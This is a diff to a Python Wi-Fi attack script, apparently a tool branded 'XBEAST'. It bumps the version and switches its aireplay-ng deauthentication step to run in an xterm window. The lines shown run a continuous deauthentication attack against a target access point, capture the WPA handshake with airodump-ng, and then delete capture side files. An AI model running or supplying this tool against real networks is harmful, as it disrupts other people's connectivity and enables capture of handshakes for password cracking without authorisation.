@@ -51,7 +51,7 @@ title = (r"""
 |__/  |__/|__/|__/             \______/  \_______/   \___/   \_______/|__/  |__/
 
                 by XBEAST ~ Embrace the power, command the networks!
-                                    v1.3
+                                    v1.4
                     Github Link: https://github.com/XBEAST1""")
 
 colored_text = colored(title, 'magenta')
@@ -162,7 +162,7 @@ handshake = input("Please Enter Target Hanshake Name : ")
 
 os.system ('killall screen')
 os.system ('screen -d -m airmon-ng start ' + iface + ' ' + targetchannel)
-os.system ('screen -d -m aireplay-ng --deauth 0 -a ' + targetbssid + ' ' + iface)
+subprocess.Popen(['xterm', '-e', 'aireplay-ng --deauth 0 -a ' + targetbssid + ' ' + iface])
 os.system ('airodump-ng -w ' + handshake + ' -c ' + targetchannel + ' --bssid ' + targetbssid  + ' ' + iface)
 os.system ('screen -d -m rm *.csv')
 os.system ('screen -d -m rm *.kismet.netxml')
